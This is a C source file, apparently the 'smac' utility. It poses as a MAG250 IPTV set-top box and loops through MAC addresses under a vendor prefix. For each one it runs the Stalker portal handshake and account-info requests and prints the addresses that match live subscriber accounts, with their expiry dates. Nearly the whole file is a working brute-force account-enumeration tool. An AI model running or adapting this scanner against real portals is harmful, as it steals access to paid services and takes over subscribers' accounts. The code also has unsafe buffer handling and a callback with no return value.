/*--------------------------------------------------------------*
 | Source code        : https://github.com/dougy147/smac    |
 | Originally written : 2026.07.31 (YYYY.MM.DD)                 |
 | Last updated       : 2026.08.02                              |
 | Licence            : BSD                                     |
 *--------------------------------------------------------------*
 | Inspired from mcbash (https://github.com/dougy147/mcbash)    |
 *--------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <curl/curl.h>

#define MAX_DNS_LEN       512
#define MAX_URL_LEN       512
#define MAX_SN_LEN        64
#define MAX_DEV_ID_LEN    64
#define MAX_TOKEN_LEN     128
#define MAX_EXP_DATE_LEN  128
#define MAX_RESPONSE_LEN  8192
#define MAX_HEADERS_LEN   1024

char tmp_url[MAX_URL_LEN]         = {0};
char tmp_headers[MAX_HEADERS_LEN] = {0};
char response[MAX_RESPONSE_LEN]   = {0};

struct curl_slist *request_headers = {0};

char dns[MAX_DNS_LEN]       = {0};
char mac[12+5+1]            = {0}; // 00:AA:11:BB:22:CC\0
char encoded_mac[12+5*3+1]  = {0}; // 00:1A:79:XX:XX:XX => 00%3A1A%3A79%3AXX%3AXX%3AXX\0
char sn[MAX_SN_LEN]         = {0};
char dev_id[MAX_DEV_ID_LEN] = {0};

char mac_prefix[12+5+1] = "00:1A:79";

const char *ua       = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3";
const char *x_ua     = "Model: MAG250; Link: WiFi";
const char *stb_lang = "en";
const char *tz       = "Europe/Amsterdam";

char token[MAX_TOKEN_LEN]       = {0};
char exp_date[MAX_EXP_DATE_LEN] = {0};

enum {
    SEQUENTIAL,
    RANDOM,
    MAC_FILE,
} Scan_Mode;

int scan_mode = RANDOM;

#define set_dns(DNS) \
    strcpy(dns,(DNS));

#define set_mac(MAC) \
    strcpy(mac,(MAC));\
    encode_mac((MAC));

#define add_to_headers(str,...) \
    snprintf(tmp_headers, sizeof(tmp_headers),(str),__VA_ARGS__);\
    request_headers = curl_slist_append(request_headers,tmp_headers);

#define make_url(URL,path_str,...) \
    snprintf((URL),sizeof((URL)),(path_str),__VA_ARGS__);

#define reset_headers() \
    request_headers = NULL;

#define request(DNS, PATH, ...)\
    make_url(tmp_url, "%s" PATH,(DNS),__VA_ARGS__);\
    reset_headers();\
    make_headers();\
    make_request(tmp_url,request_headers);

#define erase_previous_line()\
    printf("\r\033[1A"); 

#define int_to_mac_string(MAC, MAC_INT)\
    sprintf((MAC),"%02lX:%02lX:%02lX:%02lX:%02lX:%02lX",\
        (MAC_INT) >> 40 & 0XFF, (MAC_INT) >> 32 & 0XFF, \
        (MAC_INT) >> 24 & 0XFF, (MAC_INT) >> 16 & 0XFF, \
        (MAC_INT) >> 8 & 0XFF, (MAC_INT) >> 0 & 0XFF);  \


size_t static write_callback (void *buffer, size_t size, size_t nmemb, void *ptr) {
    // https://stackoverflow.com/questions/2577654/curl-put-output-into-variable
    strcpy(response,buffer); // this is to save curl response into a variable
}

void make_request(char *url, struct curl_slist *headers)
{

    CURL *curl = curl_easy_init();

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    //curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);

    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 4);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10); // sec
    
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}

bool grab_token() {
    char *i = &(response[0]);
    int token_len = 0;
    const char *pattern = "\"token\"";
    while (*i != '\0') {
        if (strncmp(pattern,i,strlen(pattern)) == 0) {
            i+=strlen(pattern);
            while(i[0] == ' ' || i[0] == ':') i++;
            if (i[0] != '"') break;
            i++;
            while(i[0] != '"') token[token_len++] = i++[0];
            break;
        }
        i++;
    }
    token[token_len] = '\0';
    //printf("parsed_token = %s\n", token);
    if (strlen(token) == 0) return false;
    return true;
}

void encode_mac(char *mac) {
    int encoded_mac_len = 0;
    while (mac[0] != '\0') {
        switch (mac[0]) {
            case ':':
                encoded_mac[encoded_mac_len++] = '%';
                encoded_mac[encoded_mac_len++] = '3';
                encoded_mac[encoded_mac_len++] = 'A';
                break;
            default:
                encoded_mac[encoded_mac_len++] = mac[0];
        }
        mac++;
    }
    encoded_mac[encoded_mac_len] = '\0';
    //printf("encoded_mac = %s\n", encoded_mac);
    }

void make_headers() {
    // append headers to request
    add_to_headers("Accept: */*", NULL);

    // building user agents and cookie
    add_to_headers("User-Agent: %s", ua);
    add_to_headers("X-User-Agent: %s", x_ua);
    add_to_headers("Cookie: mac=%s;sn=%s;device_id=%s;stb_lang=%s;tz=%s;", mac,sn,dev_id,stb_lang,tz);

    // add token
    add_to_headers("Authorization: Bearer %s", token);
}

long power(int n, unsigned int exp) {
    long res = 1;
    while (exp > 0) {
        res*=n;
        exp--;
    }
    return res;
}

void next_mac_sequential() {
    char mac_no_colon[12+1] = {0};
    for (int i = 0; i < strlen(mac); i++) {
        if (mac[i] != ':') mac_no_colon[strlen(mac_no_colon)] = mac[i];
    }
    mac_no_colon[strlen(mac_no_colon)] = '\0';

    long mac_as_int = strtol(mac_no_colon,NULL,16);
    long next_mac_as_int = (mac_as_int + 1) % 281474976710655;
    
    char next_mac[12+5+1] = {0};
    int_to_mac_string(next_mac,next_mac_as_int);
    set_mac(next_mac);
}

void next_mac_random() {
    // handle prefix
    char mac_prefix_no_colon[12+1] = {0};
    for (int i = 0; i < strlen(mac_prefix); i++) {
        if (mac_prefix[i] != ':') mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = mac_prefix[i];
    }
    mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = '\0';

    int bytes_to_fill = 12 - strlen(mac_prefix_no_colon);

    for (int i = 0; i<bytes_to_fill; i++) mac_prefix_no_colon[strlen(mac_prefix_no_colon)] = '0';
    long mac_prefix_as_int = strtol(mac_prefix_no_colon,NULL,16);
    
    char random_mac[12+5+1] = {0};
    long random_mac_as_int = mac_prefix_as_int + (rand() % power(16,bytes_to_fill));
    int_to_mac_string(random_mac, random_mac_as_int);
    set_mac(random_mac);
    //encode_mac(random_mac);
}

void next_mac() {
    switch (scan_mode) {
        case SEQUENTIAL:
            next_mac_sequential();
            break;
        case RANDOM:
            next_mac_random();
            break;
        default:
            fprintf(stderr,"[!] Unknown mode");
            exit(1);
    }
}

bool get_token() {
    request(dns,"/portal.php?action=handshake&type=stb&token=&mac=%s",encoded_mac);

    // don't fail right away
    for (int i = 0; i < 10; i++) {
        if (grab_token()) return true;
        request(dns,"/portal.php?action=handshake&type=stb&token=&mac=%s",encoded_mac);
    }

    fprintf(stderr, "[!] Could not get token");
    exit(1);
    //return false;
}

bool get_exp_date() {
    request(dns,"/portal.php?type=account_info&action=get_main_info&mac=%s",mac);

    char *i = &(response[0]);
    int exp_date_len = 0;
    const char *pattern = "\"phone\"";
    while (*i != '\0') {
        if (strncmp(pattern,i,strlen(pattern)) == 0) {
            i+=strlen(pattern);
            while(i[0] == ' ' || i[0] == ':') i++;
            if (i[0] != '"') break;
            i++;
            while(i[0] != '"') exp_date[exp_date_len++] = i++[0];
            break;
        }
        i++;
    }
    exp_date[exp_date_len] = '\0';
    //printf("parsed_expiration_date = %s\n", exp_date);
    if (strlen(exp_date) == 0) return false;
    return true;
}

bool is_valid_account() {
    get_token();
    return get_exp_date();
}

int main(int argc, char **argv) {

    srand(time(NULL));

    set_dns("http://localhost:8008/c/");
    set_mac("00:1A:79:00:00:00");
    //set_mac("00:AA:11:BB:22:CC"); //97

    float request_delay = 0.1; //µsecond

    int mac_count = 0;

    while (true) {
        mac_count++;
        printf("[%d] %s\n", mac_count, mac);
        erase_previous_line();
        if (is_valid_account()) {
            printf("[%d] \033[1;32m%s\033[0m [%s]\n", mac_count, mac, exp_date);
        }
        next_mac();
        usleep(request_delay * 1000 * 1000);
    }

    return 0;
}
